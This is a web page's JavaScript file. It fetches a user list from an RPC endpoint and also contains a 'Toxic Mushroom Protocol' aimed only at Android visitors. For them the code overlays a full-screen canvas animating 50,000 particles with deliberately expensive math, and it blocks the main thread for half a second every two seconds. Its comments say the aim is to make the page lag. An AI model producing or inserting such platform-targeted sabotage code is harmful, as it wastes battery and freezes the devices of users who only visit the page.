let throttleCount = Math.floor(Math.random() * 500) + 100;
document.getElementById('throttle-count').innerText = throttleCount;

document.getElementById('fetch-btn').addEventListener('click', async () => {
  try {
    const res = await fetch('/rpc/users/list', { method: 'POST' });
    const data = await res.json();
    document.getElementById('result').innerText = "Data: " + JSON.stringify(data);
  } catch (err) {
    document.getElementById('result').innerText = "Connection lost. (Did the server crash due to a missing charger?)";
  }
});

// Toxic Mushroom Protocol for Android
if (navigator.userAgent.toLowerCase().includes('android')) {
  console.log("Green Bubble Detected. Engaging Toxic Mushroom Protocol...");
  
  const canvas = document.createElement('canvas');
  canvas.id = 'toxic-canvas';
  document.body.appendChild(canvas);
  
  const ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  
  let particles = [];
  for(let i = 0; i < 50000; i++) { // Massive particle count to intentionally lag
    particles.push({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height,
      vx: (Math.random() - 0.5) * 10,
      vy: (Math.random() - 0.5) * 10
    });
  }
  
  function drawToxicMushroom() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = 'rgba(0, 255, 0, 0.5)'; // Green bubble color
    
    // Expensive nested loop mathematical operations
    for(let i = 0; i < particles.length; i++) {
      let p = particles[i];
      p.x += p.vx;
      p.y += p.vy;
      
      // Deliberately expensive math
      let toxicMath = Math.sin(p.x) * Math.cos(p.y) * Math.tan(p.x);
      
      ctx.fillRect(p.x + toxicMath, p.y, 2, 2);
    }
    requestAnimationFrame(drawToxicMushroom);
  }
  
  drawToxicMushroom();
  
  // Also block the main thread occasionally
  setInterval(() => {
    let start = Date.now();
    while (Date.now() - start < 500) { /* Green Channel Delay */ }
  }, 2000);
}
